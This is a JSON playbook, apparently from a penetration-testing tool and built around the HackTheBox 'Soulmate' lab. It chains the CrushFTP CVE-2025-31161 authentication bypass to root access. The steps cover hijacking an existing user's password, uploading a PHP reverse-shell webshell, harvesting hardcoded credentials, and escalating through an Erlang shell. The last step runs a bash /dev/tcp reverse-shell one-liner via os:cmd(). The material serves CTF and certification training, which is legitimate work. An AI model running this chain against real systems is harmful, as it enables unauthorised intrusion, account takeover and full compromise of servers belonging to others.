{
  "id": "web-crushftp-to-root",
  "name": "CrushFTP Authentication Bypass to Root via Erlang",
  "description": "Complete attack chain from CrushFTP CVE-2025-31161 authentication bypass to root shell via Erlang os:cmd(). KEY INSIGHT: When exploiting CrushFTP auth bypass, DO NOT create new users - they have empty VFS. Instead, hijack existing users to preserve file access.",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team",
    "created": "2026-01-06",
    "updated": "2026-01-06",
    "tags": [
      "CVE-2025-31161",
      "CRUSHFTP",
      "AUTH_BYPASS",
      "WEBSHELL",
      "ERLANG",
      "PRIVILEGE_ESCALATION",
      "HTB_SOULMATE"
    ],
    "category": "web_exploitation",
    "platform": "linux",
    "references": [
      "https://nvd.nist.gov/vuln/detail/CVE-2025-31161",
      "https://github.com/Immersive-Labs-Sec/CVE-2025-31161"
    ]
  },
  "difficulty": "intermediate",
  "time_estimate": "45 minutes",
  "certification_relevant": true,
  "prerequisites": [
    "CrushFTP version vulnerable to CVE-2025-31161 (< 11.3.1)",
    "Web interface accessible (ports 80, 443, 8080, or 9090)",
    "Main web server running (for webshell execution)",
    "Erlang service running locally on target (often port 2222)"
  ],
  "notes": "Critical exploitation path from HTB Soulmate. The key lesson is understanding CrushFTP's VFS system - newly created users have NO file access. You must hijack an existing user account to inherit their Virtual File System mappings. The Erlang privilege escalation requires finding credentials in application configs, commonly in /usr/local/lib/ or /opt/ directories.",
  "steps": [
    {
      "id": "recon-crushftp",
      "name": "Identify CrushFTP and Vulnerable Version",
      "objective": "Confirm CrushFTP is running and identify if version is vulnerable to CVE-2025-31161",
      "command_ref": "whatweb-single",
      "description": "Use whatweb, curl headers, or manual inspection to identify CrushFTP. Check /WebInterface/ path accessibility. Version info often in HTML source or HTTP headers. CVE-2025-31161 affects versions prior to 11.3.1.",
      "evidence": [
        "CrushFTP identified in response",
        "Version string (e.g., 11.W.657) visible",
        "/WebInterface/login.html accessible"
      ],
      "success_criteria": [
        "CrushFTP confirmed as target",
        "Version identified as vulnerable (< 11.3.1)"
      ],
      "failure_conditions": [
        "Different FTP software (not CrushFTP)",
        "Version 11.3.1+ (patched)",
        "WebInterface not accessible"
      ],
      "next_steps": [
        "exploit-auth-bypass"
      ]
    },
    {
      "id": "exploit-auth-bypass",
      "name": "Exploit CVE-2025-31161 Authentication Bypass",
      "objective": "Bypass authentication to gain admin panel access",
      "command_ref": "crushftp-cve-2025-31161-exploit",
      "description": "Run the CVE-2025-31161 exploit to create an admin user. The exploit abuses a flaw in AWS4-HMAC-SHA256 authentication handling. Creates a user with WEB_ADMIN privileges. Note: This user will have EMPTY VFS.",
      "dependencies": [
        "recon-crushftp"
      ],
      "evidence": [
        "User created successfully message",
        "Can access /WebInterface/UserManager/",
        "Admin functions visible"
      ],
      "success_criteria": [
        "Exploit reports user creation successful",
        "Can access admin panel with new credentials"
      ],
      "failure_conditions": [
        "Exploit fails to connect",
        "User creation blocked",
        "WAF/IPS blocks exploit traffic"
      ],
      "next_steps": [
        "enumerate-users"
      ]
    },
    {
      "id": "enumerate-users",
      "name": "Enumerate Existing Users in Admin Panel",
      "objective": "Identify existing users with VFS mappings to hijack",
      "command_ref": "curl-get",
      "description": "Access /WebInterface/UserManager/ to list existing users. Document which users exist (e.g., ben, jenna, crushadmin). CRITICAL: These existing users have VFS mappings - new users do NOT. Select target user for password hijacking.",
      "dependencies": [
        "exploit-auth-bypass"
      ],
      "evidence": [
        "List of existing users obtained",
        "Target user identified (e.g., 'ben')",
        "User has visible VFS directories like /IT/, /webProd/"
      ],
      "success_criteria": [
        "Found user with VFS access to web-accessible directories",
        "Username documented for next step"
      ],
      "failure_conditions": [
        "No existing users with useful VFS",
        "Cannot access UserManager"
      ],
      "next_steps": [
        "hijack-user"
      ]
    },
    {
      "id": "hijack-user",
      "name": "Modify Existing User Password",
      "objective": "Change existing user's password to hijack their account and VFS access",
      "command_ref": "crushftp-admin-user-modify",
      "description": "In UserManager, select the target user (e.g., 'ben'). Click 'Generate random Password', then replace with your password. Click 'Use this password' then 'Save'. This preserves the user's VFS mappings while giving you access.",
      "dependencies": [
        "enumerate-users"
      ],
      "evidence": [
        "Password change success message",
        "Can logout and login as hijacked user",
        "File browser shows VFS directories (not empty)"
      ],
      "success_criteria": [
        "Password successfully changed",
        "Login as hijacked user works",
        "VFS shows directories like /webProd/"
      ],
      "failure_conditions": [
        "Password change blocked",
        "User in protected group",
        "VFS still empty (wrong user)"
      ],
      "next_steps": [
        "upload-webshell"
      ]
    },
    {
      "id": "upload-webshell",
      "name": "Upload PHP Webshell to webProd",
      "objective": "Upload webshell to web-accessible directory via CrushFTP",
      "command_ref": "crushftp-webprod-upload",
      "description": "As the hijacked user, navigate to /webProd/ in the file browser. Click 'Add File' or upload button. Select PHP reverse shell (e.g., pentestmonkey php-reverse-shell.php). This directory maps to the main web server's document root.",
      "dependencies": [
        "hijack-user"
      ],
      "evidence": [
        "Upload successful message",
        "Shell.php visible in /webProd/ listing",
        "File accessible via main web server (not CrushFTP port)"
      ],
      "success_criteria": [
        "Webshell uploaded successfully",
        "File accessible via HTTP on main web server port"
      ],
      "failure_conditions": [
        "Upload permission denied",
        "File blocked by extension filter",
        "/webProd/ not in user's VFS"
      ],
      "next_steps": [
        "trigger-shell"
      ]
    },
    {
      "id": "trigger-shell",
      "name": "Trigger Webshell for Reverse Connection",
      "objective": "Execute uploaded webshell to obtain initial foothold",
      "command_ref": "nc-listener",
      "description": "Start netcat listener on attacker machine. Access the uploaded shell via the MAIN web server (e.g., http://soulmate.htb/shell.php - NOT the CrushFTP port). Shell executes and connects back as www-data.",
      "dependencies": [
        "upload-webshell"
      ],
      "evidence": [
        "Listener receives connection",
        "Shell prompt as www-data",
        "Commands execute on target"
      ],
      "success_criteria": [
        "Reverse shell received",
        "Stable shell established",
        "Can run commands as www-data"
      ],
      "failure_conditions": [
        "Firewall blocks outbound connection",
        "PHP not executed (wrong server config)",
        "Connection timeout"
      ],
      "next_steps": [
        "enumerate-linpeas"
      ]
    },
    {
      "id": "enumerate-linpeas",
      "name": "Run LinPEAS for Privilege Escalation Vectors",
      "objective": "Identify privilege escalation paths on target system",
      "command_ref": "linux-linpeas",
      "description": "Download and run LinPEAS on target. Save output to /dev/shm/linpeas.txt for searching. Focus on: unusual services, SUID binaries, cron jobs, and config files with credentials. Look especially for Erlang/OTP services.",
      "dependencies": [
        "trigger-shell"
      ],
      "evidence": [
        "LinPEAS output saved",
        "Unusual services identified",
        "Potential credentials in configs"
      ],
      "success_criteria": [
        "Found Erlang/OTP service running",
        "Identified config files with potential credentials",
        "Noted non-standard ports (e.g., 2222)"
      ],
      "failure_conditions": [
        "Cannot download LinPEAS",
        "Script blocked by AV"
      ],
      "next_steps": [
        "search-credentials"
      ]
    },
    {
      "id": "search-credentials",
      "name": "Search for Hardcoded Credentials",
      "objective": "Find credentials in configuration files for privilege escalation",
      "command_ref": "linpeas-credential-grep",
      "description": "Search LinPEAS output and common locations for hardcoded credentials. Key targets: Erlang scripts in /usr/local/lib/, application configs in /opt/, .env files. Look for user_passwords, auth tokens, SSH credentials.",
      "dependencies": [
        "enumerate-linpeas"
      ],
      "evidence": [
        "Credentials found in config file",
        "Username/password pair extracted",
        "Associated service identified (Erlang SSH)"
      ],
      "success_criteria": [
        "Valid credentials discovered",
        "Credentials associated with elevated service",
        "Port for service identified"
      ],
      "failure_conditions": [
        "No credentials found",
        "Credentials don't grant access"
      ],
      "next_steps": [
        "ssh-erlang"
      ]
    },
    {
      "id": "ssh-erlang",
      "name": "SSH to Erlang Service Port",
      "objective": "Access Erlang shell using discovered credentials",
      "command_ref": "ssh-login-password",
      "description": "Use discovered credentials to SSH to Erlang service port (commonly 2222). Command: ssh user@localhost -p 2222. This provides access to Erlang shell (Eshell) running with elevated privileges.",
      "dependencies": [
        "search-credentials"
      ],
      "evidence": [
        "SSH connection successful",
        "Erlang shell prompt (Eshell V15.x.x)",
        "Shell shows 'ssh_runner@hostname'"
      ],
      "success_criteria": [
        "Authenticated to Erlang SSH",
        "Erlang shell (Eshell) access obtained",
        "os:cmd() function available"
      ],
      "failure_conditions": [
        "SSH authentication failed",
        "Port not accessible",
        "Erlang shell restricted"
      ],
      "next_steps": [
        "erlang-root"
      ]
    },
    {
      "id": "erlang-root",
      "name": "Execute os:cmd() for Root Shell",
      "objective": "Use Erlang os:cmd() to escalate to root privileges",
      "command_ref": "erlang-shell-oscmd",
      "description": "From Erlang shell, use os:cmd() to execute system commands. Verify root: os:cmd(\"id\"). shows uid=0. Execute reverse shell: os:cmd(\"bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'\"). Remember: commands MUST end with period (.).",
      "dependencies": [
        "ssh-erlang"
      ],
      "evidence": [
        "os:cmd(\"id\"). returns uid=0(root)",
        "Can read /root/root.txt",
        "Reverse shell connects as root"
      ],
      "success_criteria": [
        "Commands execute as root",
        "Root flag captured",
        "Full system compromise achieved"
      ],
      "failure_conditions": [
        "os:cmd() function restricted",
        "Erlang not running as root",
        "Syntax errors in Erlang commands"
      ]
    }
  ]
}
